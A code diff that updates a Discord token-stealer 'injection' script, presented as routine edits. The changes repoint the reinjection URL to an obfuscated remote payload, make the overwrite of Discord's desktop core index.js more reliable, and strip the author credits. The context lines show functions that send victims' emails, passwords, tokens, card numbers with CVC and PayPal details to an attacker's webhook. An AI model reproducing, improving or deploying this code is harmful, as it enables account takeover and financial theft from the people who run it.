@@ -6,18 +6,16 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: '%WEBHOOK%', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
-  webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector
-  auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
-  ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
-  ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
-  embed_name: 'Anonymous Injection', //name of the webhook thats gonna send the info
-  embed_icon: 'https://media.tenor.com/OlkCUrnKZiwAAAAC/anonymous-glitching.gif?size=4096'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
-  embed_color: 1005149, //for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://raw.githubusercontent.com/mishakabatedd/name/main/injection.js', //injection url for when it reinjects
-  /**
-   * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
-   **/
+  webhook: '%WEBHOOK%',
+  webhook_protector_key: '%WEBHOOK_KEY%',
+  auto_buy_nitro: false, 
+  ping_on_run: false, 
+  ping_val: '@everyone', 
+  embed_name: 'Anonymous Injection', 
+  embed_icon: 'https://cdn.discordapp.com/attachments/1076253206700634292/1077942039485894687/image.png', 
+  embed_color: 0, 
+  injection_url: 'https://raw.githubusercontent.com/addi00000/empyrean-injection/master/obfuscated.js', 
+
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
@@ -414,7 +412,8 @@ function updateCheck() {
   const appPath = path.join(resourcePath, 'app');
   const packageJson = path.join(appPath, 'package.json');
   const resourceIndex = path.join(appPath, 'index.js');
-  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
+  const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0]
+  const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
   const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
   if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
   if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
@@ -502,7 +501,7 @@ const getBilling = async (token) => {
           billing += '💳 ';
           break;
         case 2:
-          billing += '<:paypal:951139189389410365>';
+          billing += '<:paypal:951139189389410365> ';
           break;
       }
     }
@@ -588,6 +587,9 @@ const getBadges = (flags) => {
       break;
     case 131072:
       badges += 'Verified Bot Developer, ';
+      break;
+    case 4194304:
+      badges += 'Active Developer, ';
       break;
     case 4:
       badges += 'Hypesquad Event, ';
@@ -679,9 +681,6 @@ const login = async (email, password, token) => {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
-        footer: {
-          text: 'Anonymous Injection by Sleazyy',
-        },
       },
     ],
   };
@@ -720,9 +719,6 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-        footer: {
-          text: 'Anonymous Injection by Sleazyy',
         },
       },
     ],
@@ -763,9 +759,6 @@ const emailChanged = async (email, password, token) => {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
-        footer: {
-          text: 'Anonymous Injection by Sleazyy',
-        },
       },
     ],
   };
@@ -805,9 +798,6 @@ const PaypalAdded = async (token) => {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
-        footer: {
-          text: 'Anonymous Injection by Sleazyy',
-        },
       },
     ],
   };
@@ -846,9 +836,6 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-        footer: {
-          text: 'Anonymous Injection by Sleazyy',
         },
       },
     ],
@@ -890,9 +877,6 @@ const nitroBought = async (token) => {
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-        footer: {
-          text: 'Anonymous Injection by Sleazyy',
         },
       },
     ],
